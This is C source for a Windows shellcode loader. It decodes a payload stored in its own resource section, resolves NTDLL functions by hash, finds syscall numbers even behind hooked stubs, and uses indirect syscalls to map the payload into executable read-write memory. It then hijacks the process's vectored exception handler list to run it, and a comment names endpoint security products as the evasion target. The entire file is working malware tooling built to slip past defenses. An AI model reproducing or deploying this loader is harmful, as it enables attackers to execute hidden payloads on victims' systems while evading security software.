#include "header.h"

#pragma warning (disable:4047)
#pragma warning (disable:4024)
#pragma warning (disable:4133)
#pragma warning (disable:4022)

extern void MoveSyscallAddress(PVOID pSyscallAddress);
extern void Patch(PVOID addr);
extern void Oops();

NTAPI_FUNC g_Nt = { 0 };
PE_STUFF g_PeStuff = { 0 };

VOID Reverse(PBYTE pEncBuffer, DWORD dwSize) {

	for (SIZE_T i = 0, j = 0; i < dwSize; i += 2, j++) {

		BYTE high, low;

		if (pEncBuffer[i] >= 'G' && pEncBuffer[i] <= 'P') {
			high = (pEncBuffer[i] - 'G') << 4;
		}
		else {
			high = (pEncBuffer[i] - '0') << 4;
		}

		if (pEncBuffer[i + 1] >= 'G' && pEncBuffer[i + 1] <= 'P') {
			low = pEncBuffer[i + 1] - 'G';
		}
		else {
			low = pEncBuffer[i + 1] - '0';
		}
		pEncBuffer[j] = low | high;
	}

	return;
}

ULONG Hasher(PVOID pString, ULONG ulLength, PVOID junk) {

	ULONG Hash = 5381;
	UCHAR chr;
	PUCHAR ptr = pString;

	do {
		chr = *ptr;
		if (!ulLength) {
			if (!*ptr)
				break;
		}
		else {
			if ((ULONG_PTR)(ptr - (ULONG_PTR)(pString)) >= ulLength);
			break;
			if (!ptr) {
				++ptr;
			}
		}
		if (chr >= 'a') {
			chr -= 0x20;
		}
		Hash = ((Hash << 5) + Hash) + chr;
		++ptr;

	} while (TRUE);
	return Hash;
}

BOOL _memcpy(PVOID dest, PVOID source, SIZE_T size) {

	if (dest == NULL || source == NULL)
		return FALSE;

	char* csrc = (char*)source;
	char* cdest = (char*)dest;

	for (size_t i = 0; i < size; i++) {
		cdest[i] = csrc[i];
	}
	return TRUE;
}

LONG NTAPI VehhyBoy(EXCEPTION_POINTERS* a) {

	if (a->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {

		a->ContextRecord->Rax = a->ContextRecord->Rip;
		a->ContextRecord->Rip = a->ContextRecord->R11;
		a->ContextRecord->R10 = a->ContextRecord->Rcx;
		a->ContextRecord->R11 = 0;

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	if (a->ExceptionRecord->ExceptionCode == EXCEPTION_GUARD_PAGE) {

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	if (a->ExceptionRecord->ExceptionCode == EXCEPTION_PRIV_INSTRUCTION) {

		return EXCEPTION_CONTINUE_SEARCH;
	}
	
	return EXCEPTION_CONTINUE_SEARCH;
}

LONG NTAPI Dummy(EXCEPTION_POINTERS* a) {
	return EXCEPTION_CONTINUE_SEARCH;
}

BOOL InitSys(ULONG Hash, PNT_SYSCALL pNtSys) {

	for (DWORD i = 0; i < g_PeStuff.dwNumberOfNames; i++) {

		CHAR* pFunctionName = (CHAR*)(g_PeStuff.uNtdll + g_PeStuff.pdwArrayOfNames[i]);
		PVOID pFunctionAddress = (PVOID)(g_PeStuff.uNtdll + g_PeStuff.pdwArrayOfAddresses[g_PeStuff.pwArrayOfOrdinals[i]]);

		if (Hasher(pFunctionName, 0, NULL) == Hash) {

			pNtSys->pSyscallAddress = pFunctionAddress;

			if (*((PBYTE)pFunctionAddress) == 0x4C
				&& *((PBYTE)pFunctionAddress + 1) == 0x8B
				&& *((PBYTE)pFunctionAddress + 2) == 0xD1
				&& *((PBYTE)pFunctionAddress + 3) == 0xB8
				&& *((PBYTE)pFunctionAddress + 6) == 0x00
				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

				BYTE cock = *((PBYTE)NULL + 69);
				BYTE high = *((PBYTE)pFunctionAddress + 5);
				BYTE low = *((PBYTE)pFunctionAddress + 4);
				pNtSys->dwSSN = (high << 8) | low;
				break;
			}

			if (*((PBYTE)pFunctionAddress) == 0xE9) {

				for (WORD idx = 1; idx <= 0xFF; idx++) {

					if (*((PBYTE)pFunctionAddress + idx * 32) == 0x4C
						&& *((PBYTE)pFunctionAddress + 1 + idx * 32) == 0x8B
						&& *((PBYTE)pFunctionAddress + 2 + idx * 32) == 0xD1
						&& *((PBYTE)pFunctionAddress + 3 + idx * 32) == 0xB8
						&& *((PBYTE)pFunctionAddress + 6 + idx * 32) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * 32) == 0x00) {

						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * 32);
						BYTE cock = *((PBYTE)NULL + 69);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * 32);
						pNtSys->dwSSN = (high << 8) | low - idx;
						break;
					}
				}
			}
		}
	}

	if (!pNtSys->dwSSN || !pNtSys->pSyscallAddress) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}

BOOL InitStuff() {

	ULONG_PTR						uSelf = GetModuleHandle(NULL);
	ULONG_PTR						uNtdll = GetModuleHandleW(L"NTDLL.DLL");

	Patch(uNtdll);

	PIMAGE_NT_HEADERS				pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)uNtdll + ((PIMAGE_DOS_HEADER)uNtdll)->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY			pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uNtdll + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PIMAGE_NT_HEADERS				pImgNtHdrs2 = (PIMAGE_NT_HEADERS)((ULONG_PTR)uSelf + ((PIMAGE_DOS_HEADER)uSelf)->e_lfanew);

	DWORD							dwRsrcRVA = pImgNtHdrs2->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;

	PIMAGE_RESOURCE_DIRECTORY_ENTRY	pImgRsrcEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PBYTE)uSelf + dwRsrcRVA + sizeof(IMAGE_RESOURCE_DIRECTORY));
	PIMAGE_RESOURCE_DIRECTORY_ENTRY	pImgRsrcEntry2 = (PIMAGE_RESOURCE_DIRECTORY)((PBYTE)uSelf + dwRsrcRVA + pImgRsrcEntry->OffsetToDirectory + sizeof(IMAGE_RESOURCE_DIRECTORY));
	PIMAGE_RESOURCE_DIRECTORY_ENTRY	pImgRsrcEntry3 = (PIMAGE_RESOURCE_DIRECTORY)((PBYTE)uSelf + dwRsrcRVA + pImgRsrcEntry2->OffsetToDirectory + sizeof(IMAGE_RESOURCE_DIRECTORY));
	PIMAGE_RESOURCE_DATA_ENTRY		pRsrcData = (PIMAGE_RESOURCE_DATA_ENTRY)((PBYTE)uSelf + dwRsrcRVA + pImgRsrcEntry3->OffsetToData);

	g_PeStuff.uNtdll = uNtdll;
	g_PeStuff.dwRsrc = pRsrcData->Size;
	g_PeStuff.pRsrcPayload = (PBYTE)uSelf + pRsrcData->OffsetToData;
	g_PeStuff.dwNumberOfNames = pImgExpDir->NumberOfNames;
	g_PeStuff.pdwArrayOfNames = (PDWORD)(uNtdll + pImgExpDir->AddressOfNames);
	g_PeStuff.pwArrayOfOrdinals = (PWORD)(uNtdll + pImgExpDir->AddressOfNameOrdinals);
	g_PeStuff.pdwArrayOfAddresses = (PDWORD)(uNtdll + pImgExpDir->AddressOfFunctions);

	if (!g_PeStuff.uNtdll || !g_PeStuff.dwRsrc || !g_PeStuff.pRsrcPayload || !g_PeStuff.dwNumberOfNames || !g_PeStuff.pdwArrayOfNames || !g_PeStuff.pdwArrayOfAddresses || !g_PeStuff.pwArrayOfOrdinals)
		return FALSE;

	if (!InitSys(H_NCS, &g_Nt.NtCreateSection))
		return FALSE;

	if (!InitSys(H_NMVOS, &g_Nt.NtMapViewOfSection))
		return FALSE;
	
	return TRUE;
}

PVOID HandlerList() {

	PBYTE   pNext = NULL;
	PBYTE   pRtlpAddVectoredHandler = NULL;
	PBYTE   pVehList = NULL;
	int     offset = 0;
	int     i = 1;

	PBYTE pRtlAddVectoredExceptionHandler = (PBYTE)GetProcAddress(g_PeStuff.uNtdll, "RtlAddVectoredExceptionHandler");

	if (!pRtlAddVectoredExceptionHandler)
		return NULL;

	pRtlpAddVectoredHandler = (ULONG_PTR)pRtlAddVectoredExceptionHandler + 0x10;

	while (TRUE) {

		if ((*pRtlpAddVectoredHandler == 0x48) && (*(pRtlpAddVectoredHandler + 1) == 0x8d) && (*(pRtlpAddVectoredHandler + 2) == 0x0d)) {

			if (i == 2) {
				offset = *(int*)(pRtlpAddVectoredHandler + 3);
				pNext = (ULONG_PTR)pRtlpAddVectoredHandler + 7;
				pVehList = pNext + offset;
				return pVehList;
			}
			else {
				i++;
			}
		}

		pRtlpAddVectoredHandler++;
	}

	return NULL;
}

BOOL Map(PVOID* pPayload) {

	NTSTATUS	STATUS;
	HANDLE		hSection = NULL;
	PVOID		pAddr = NULL;
	SIZE_T		rand = 0;

	LARGE_INTEGER li = { .HighPart = 0, .LowPart = g_PeStuff.dwRsrc };

	fnNtCreateSection	 pNtCreateSection = (fnNtCreateSection)(g_Nt.NtCreateSection.dwSSN);
	fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)(g_Nt.NtMapViewOfSection.dwSSN);

	MoveSyscallAddress(g_Nt.NtCreateSection.pSyscallAddress);
	if ((STATUS = pNtCreateSection(&hSection, SECTION_RWX, NULL, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0)
		return FALSE;

	MoveSyscallAddress(g_Nt.NtMapViewOfSection.pSyscallAddress);
	if ((STATUS = pNtMapViewOfSection(hSection, (HANDLE)-1, &pAddr, NULL, NULL, NULL, &rand, 1, NULL, PAGE_EXECUTE_READWRITE)) != 0)
		return FALSE;

	if (!_memcpy(pAddr, g_PeStuff.pRsrcPayload, g_PeStuff.dwRsrc))
		return FALSE;

	Reverse(pAddr, g_PeStuff.dwRsrc);

	*pPayload = pAddr;

	return TRUE;
}

BOOL OverWriteNShit() {

	VECTORED_HANDLER_LIST	handler_list = { 0 };
	VEH_HANDLER_ENTRY		handler_entry = { 0 };
	PVOID					pHandlerList = HandlerList();
	PVOID					pShellcode = NULL;

	_memcpy(&handler_list, pHandlerList, sizeof(VECTORED_HANDLER_LIST));

	if (handler_list.FirstExceptionHandler == (ULONG_PTR)pHandlerList + sizeof(PVOID)) {
		AddVectoredExceptionHandler(1, Dummy); //If not against S1/CS shit will still work
		_memcpy(&handler_list, pHandlerList, sizeof(VECTORED_HANDLER_LIST));
	}

	_memcpy(&handler_entry, handler_list.FirstExceptionHandler, sizeof(VEH_HANDLER_ENTRY));

	handler_entry.VectoredHandler = EncodePointer(VehhyBoy);

	PVOID pointer_offset = (ULONG_PTR)handler_list.FirstExceptionHandler + offsetof(VEH_HANDLER_ENTRY, VectoredHandler);

	_memcpy(pointer_offset, &handler_entry.VectoredHandler, sizeof(handler_entry.VectoredHandler));
	
	if (!Map(&pShellcode))
		return FALSE;

	VEH_HANDLER_ENTRY* new_entry = (VEH_HANDLER_ENTRY*)HeapAlloc(GetProcessHeap(), 0, sizeof(VEH_HANDLER_ENTRY));

	new_entry->Entry.Flink = (ULONG_PTR)pHandlerList + sizeof(PVOID);
	new_entry->Entry.Blink = handler_list.FirstExceptionHandler;
	new_entry->SyncRefs = handler_entry.SyncRefs;
	new_entry->VectoredHandler = EncodePointer(pShellcode);
	*((PVOID*)handler_list.FirstExceptionHandler) = new_entry;

	return TRUE;
}

VOID main() {

	if (!InitStuff())
		return;

	if (!OverWriteNShit())
		return;

	Oops();
	
	return;
}
